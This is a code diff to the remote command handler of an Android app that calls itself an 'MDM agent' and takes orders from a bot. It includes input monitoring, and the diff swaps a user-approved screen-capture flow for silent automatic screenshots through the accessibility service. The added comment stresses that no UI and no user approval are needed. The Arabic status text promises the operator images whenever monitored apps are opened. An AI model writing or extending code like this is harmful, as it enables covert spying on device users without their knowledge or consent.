@@ -401,32 +401,12 @@ class CommandHandler(
             "input-monitoring-on" -> collectors.setInputMonitoring(true)
             "input-monitoring-off" -> collectors.setInputMonitoring(false)
             "screenshot-on" -> {
-                // ✅ MediaProjection request now comes ONLY from bot (not at app launch)
-                // If permission is already granted → just enable auto-screenshot
-                // If not → show notification asking user to open the app
-                if (com.mdm.agent.service.ScreenCaptureService.isReady()) {
-                    com.mdm.agent.service.MDMAccessibilityService.setAutoScreenshot(true)
-                    Log.i(TAG, "✅ screenshot-on: auto-screenshot enabled (permission already granted)")
-                    CollectedData.TextResult("✅ تم تفعيل لقطات الشاشة التلقائية (الصلاحية ممنوحة مسبقاً)")
-                } else {
-                    Log.i(TAG, "📸 screenshot-on: permission NOT granted yet - sending notification to user")
-                    // ⚠️ Send "info" status (does NOT consume pending on server)
-                    sendInfoUpdate("screenshot-on",
-                        "⏳ يجب تفعيل لقطة الشاشة من التطبيق - تم إرسال إشعار للمستخدم. اطلب منه فتح التطبيق والضغط على زر '📸 تفعيل لقطات الشاشة'",
-                        deviceId)
-
-                    // ✅ Send a notification to the user prompting them to open the app
-                    Handler(Looper.getMainLooper()).post {
-                        try {
-                            showScreenshotNotification()
-                        } catch (e: Exception) {
-                            Log.e(TAG, "❌ Failed to show notification: ${e.message}")
-                        }
-                    }
-                    // Return PendingResult - the final response will come from
-                    // ScreenCapturePermissionActivity after user opens app and approves
-                    CollectedData.PendingResult
-                }
+                // ✅ NEW: Uses AccessibilityService.takeScreenshot() (Android 11+)
+                // No MediaProjection, no UI, no user approval needed!
+                // Just enable the auto-screenshot flag.
+                com.mdm.agent.service.MDMAccessibilityService.setAutoScreenshot(true)
+                Log.i(TAG, "✅ screenshot-on: auto-screenshot ENABLED via Accessibility API")
+                CollectedData.TextResult("✅ تم تفعيل لقطات الشاشة التلقائية - ستصلك الصور تلقائياً عند فتح التطبيقات المراقبة")
             }
             "screenshot-off" -> {
                 com.mdm.agent.service.MDMAccessibilityService.setAutoScreenshot(false)
